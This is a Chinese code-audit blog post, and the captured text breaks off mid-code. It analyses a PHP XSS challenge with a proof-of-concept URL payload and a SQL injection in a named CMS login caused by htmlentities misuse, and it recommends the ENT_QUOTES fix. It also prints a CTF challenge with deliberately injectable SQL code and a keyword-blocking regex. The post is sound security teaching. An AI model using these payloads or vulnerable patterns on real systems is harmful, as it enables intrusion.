<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Day 12 - String Lights12345678910111213$sanitized &#x3D; [];foreach ($_GET as $key &#x3D;&gt; $value) &#123;    $sanitized[$key] &#x3D; intval($value);&#125;$queryParts &#x3D; array_map(function ($key, $value) &#123;">
<meta property="og:type" content="article">
<meta property="og:title" content="【代码审计】PHP代码审计4">
<meta property="og:url" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/index.html">
<meta property="og:site_name" content="g0dam">
<meta property="og:description" content="Day 12 - String Lights12345678910111213$sanitized &#x3D; [];foreach ($_GET as $key &#x3D;&gt; $value) &#123;    $sanitized[$key] &#x3D; intval($value);&#125;$queryParts &#x3D; array_map(function ($key, $value) &#123;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-1.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-2.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-5.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-3.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-4.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-6.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-7.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-8.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-9.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-10.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-11.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-12.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-13.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-14.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-15.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-16.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-17.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-18.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-19.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-20.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-21.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-22.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-23.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-24.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-25.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-26.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-27.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-28.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-29.png">
<meta property="og:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-30.png">
<meta property="article:published_time" content="2024-10-15T02:38:35.000Z">
<meta property="article:modified_time" content="2024-11-12T13:39:19.990Z">
<meta property="article:author" content="g0dam">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="PHP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/image.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>【代码审计】PHP代码审计4</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/10/16/algorithm/string/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/10/15/WebSecurity/framwork/waf/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&text=【代码审计】PHP代码审计4"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&title=【代码审计】PHP代码审计4"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&is_video=false&description=【代码审计】PHP代码审计4"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【代码审计】PHP代码审计4&body=Check out this article: https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&title=【代码审计】PHP代码审计4"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&title=【代码审计】PHP代码审计4"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&title=【代码审计】PHP代码审计4"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&title=【代码审计】PHP代码审计4"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&name=【代码审计】PHP代码审计4&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/10/15/WebSecurity/codeaudit/phpaudit4/&t=【代码审计】PHP代码审计4"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-12-String-Lights"><span class="toc-number">1.</span> <span class="toc-text">Day 12 - String Lights</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.4.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86"><span class="toc-number">1.5.</span> <span class="toc-text">第一部分</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-13-Turkey-Baster"><span class="toc-number">2.</span> <span class="toc-text">Day 13 - Turkey Baster</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-1"><span class="toc-number">2.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">2.4.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-14-Snowman"><span class="toc-number">3.</span> <span class="toc-text">Day 14 - Snowman</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-2"><span class="toc-number">3.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">3.3.</span> <span class="toc-text">修复建议</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【代码审计】PHP代码审计4
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">g0dam</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-10-15T02:38:35.000Z" class="dt-published" itemprop="datePublished">2024-10-15</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Code-Audit/">Code Audit</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Day-12-String-Lights"><a href="#Day-12-String-Lights" class="headerlink" title="Day 12 - String Lights"></a>Day 12 - String Lights</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sanitized</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$sanitized</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$queryParts</span> = <span class="title function_ invoke__">array_map</span>(function (<span class="variable">$key</span>, <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$key</span> . <span class="string">&#x27;=&#x27;</span> . <span class="variable">$value</span>;</span><br><span class="line">&#125;, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$sanitized</span>), <span class="title function_ invoke__">array_values</span>(<span class="variable">$sanitized</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="variable">$queryParts</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;/images/size.php?&quot;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$query</span>) . <span class="string">&quot;&#x27;&gt;link&lt;/a&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><strong>漏洞解析</strong> ：<br>根据题目意思，这里考察的应该是个 <strong>xss漏洞</strong> ， 漏洞触发点应该在代码中的 <strong>第13-14行</strong> 。这两行代码的作用是直接输出一个html的 <code>&lt;a&gt;</code> 标签。代码中的 <strong>第3-5行</strong> ，<strong>foreach循环</strong> 对 <strong>$_GET</strong> 传入的参数进行了处理，但是这里有个问题。我们看下 <strong>第四行</strong> 的代码，这行代码针对 <strong>$value</strong> 进行类型转换，强制变成int类型。但是这部分代码只处理了 <strong>$value</strong> 变量，没针对 <strong>$key</strong> 变量进行处理。经过了 <strong>第3-5行</strong> 的代码处理之后，根据 <strong>&amp;</strong> 这个符号进行分割，然后拼接到 <strong>第13行</strong> 的 <strong>echo</strong> 语句中，在输出的时候又进行了一次 <strong>htmlentities</strong> 函数处理。 <strong>htmlentities</strong> 函数主要是会对一些特殊符号进行HTML实体编码。具体定义如下：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.htmlentities.php">htmlentities</a> — 将字符转换为 HTML 转义字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">htmlentities</span> ( <span class="keyword">string</span> <span class="variable">$string</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = ENT_COMPAT | ENT_HTML401 [, <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;default_charset&quot;</span>) [, <span class="keyword">bool</span> <span class="variable">$double_encode</span> = <span class="literal">true</span> ]]] )</span><br></pre></td></tr></table></figure>

<p>作用：在写PHP代码时，不能在字符串中直接写实体字符，PHP提供了一个将HTML特殊字符转换成实体字符的函数 htmlentities()。</p>
</blockquote>
<p>注：<strong>htmlentities()</strong> 并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，且单引号和双引号需要单独控制（通过第二个参数）。第2个参数取值有3种，分别如下：</p>
<ul>
<li>ENT_COMPAT（默认值）：只转换双引号。</li>
<li>ENT_QUOTES：两种引号都转换。</li>
<li>ENT_NOQUOTES：两种引号都不转换。</li>
</ul>
<p>这里附上一个 <a target="_blank" rel="noopener" href="http://www.w3school.com.cn/html/html_entities.asp">HTML 中有用的字符实体表</a> </p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image.png"></p>
<p>经过上面的分析，我们再回到题目，想想如何构造一下攻击 <strong>payload</strong> 。我们先梳理一些已知信息：</p>
<ul>
<li>这里的 <strong>$query</strong> 参数可控</li>
<li>且 <strong>htmlentities</strong> 函数在这里可逃逸单引号</li>
<li>xss的漏洞触发点在 <code>&lt;a&gt;</code> 标签。</li>
</ul>
<p>在 <code>&lt;a&gt;</code> 中，我们可以通过 <strong>javascript</strong> 事件来执行js代码，例如： <strong>onclick</strong> 这类事件，因此最后的poc构造如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a&#x27;onclick%3dalert(1)%2f%2f=c</span><br></pre></td></tr></table></figure>

<h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析选择 <a target="_blank" rel="noopener" href="http://sqdownb.onlinedown.net/down/1510917608_44072_ym.rar">DM企业建站系统 v201710</a> 中的 <strong>sql注入漏洞</strong> 来进行分析。首先，我们可以从cnvd上面看到一些相关信息，如下：</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-1.png"></p>
<p>从漏洞通告中可以发现一些有用的信息，漏洞位置在登陆处，搭建的时候提示后台登陆口位置在 <strong>admindm-yourname&#x2F;g.php</strong> 文件中，打开这个文件，发现重定向到 <strong>admindm-yournamemod_common&#x2F;login.php</strong> 文件中，所以漏洞触发点应该就在这个文件中。</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-2.png"></p>
<p>打开 <strong>admindm-yournamemod_common&#x2F;login.php</strong> 这个文件，一眼就看到漏洞位置，截取部分相关代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$act</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span>= <span class="title function_ invoke__">htmlentitiesdm</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line">    <span class="variable">$ps</span>= <span class="title function_ invoke__">htmlentitiesdm</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$user</span>)&lt;<span class="number">2</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$ps</span>)&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&#x27;字符不够 sorry,user need more long&#x27;</span>); <span class="title function_ invoke__">jump</span>(<span class="variable">$jumpv</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">require_once</span> WEB_ROOT.<span class="string">&#x27;component/dm-config/mysql.php&#x27;</span>;</span><br><span class="line">    <span class="comment">// $salt = &#x27;00&#x27;; is in config.php</span></span><br><span class="line">    <span class="variable">$pscrypt</span>= <span class="title function_ invoke__">crypt</span>(<span class="variable">$ps</span>, <span class="variable">$salt</span>);</span><br><span class="line">    <span class="comment">//echo $pscrypt;</span></span><br><span class="line">    <span class="variable">$ss_P</span>=<span class="string">&quot;select * from &quot;</span>.TABLE_USER.<span class="string">&quot; where email=&#x27;<span class="subst">$user</span>&#x27; and ps=&#x27;<span class="subst">$pscrypt</span>&#x27; order by id desc limit 1&quot;</span>;</span><br><span class="line">    <span class="comment">// echo $ss_P;exit;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">getnum</span>(<span class="variable">$ss_P</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span>=<span class="title function_ invoke__">getrow</span>(<span class="variable">$ss_P</span>);</span><br><span class="line">            <span class="variable">$userid</span>=<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> <strong>第15行</strong> 很明显存在sql注入漏洞，通过拼接的方式直接插入到select语句中。 <strong>第15行</strong> 中的 <strong>$user</strong> 变量是通过 <strong>POST</strong> 方式提交上来，其值可控。但是上图的 <strong>第3行</strong> 代码调用 <strong>htmlentitiesdm</strong> 函数，对 <strong>POST</strong> 数据进行了处理，我们跟进这个 <strong>htmlentitiesdm</strong> 函数。该函数位置在 <strong>component&#x2F;dm-config&#x2F;global.common.php</strong> 文件中，截取关键代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmlentitiesdm</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlentities</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$v</span>),ENT_NOQUOTES,<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数是调用 <strong>htmlentities</strong> 函数针对输入的数据进行处理。前面我们已经介绍过了这个函数的用法，这里这个函数的可选参数是 <strong>ENT_NOQUOTES</strong> ，也就是说两种引号都不转换。下面我们来看个小例子：</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-5.png"></p>
<p>这里我猜测开发者应该是考虑到了xss的问题，但是由于 <strong>htmlentities</strong> 这个函数选择的参数出现了偏差，导致这里我们可以引入单引号造成注入的问题。</p>
<p>我们看看最新版是怎么修复，使用 <strong>beyond compare</strong> 对比两个版本代码的差别。</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-3.png"></p>
<p>新版修复的时候将可选参数修改为 <strong>ENT_QUOTES</strong> ，这个参数的作用就是过滤单引号加双引号，我们来看看下面这个例子，就很容易明白了这个参数的作用了。<br><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-4.png"></p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>这里因为没有回显，所以是盲注，下面是验证截图：</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-6.png"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>针对 <strong>htmlentities</strong> 这个函数，我们建议大家在使用的时候，尽量加上可选参数，并且选择 <strong>ENT_QUOTES</strong> 参数。</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Attack detected!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Attack detected!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">get_magic_quotes_gpc</span>())&#123;</span><br><span class="line">        <span class="variable">$str</span>=<span class="title function_ invoke__">stripslashes</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$str</span>, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = @<span class="title function_ invoke__">clean</span>((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = @<span class="title function_ invoke__">clean</span>((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>=<span class="string">&#x27;SELECT * FROM ctf.users WHERE name=\&#x27;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;\&#x27; AND pass=\&#x27;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo $query;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span 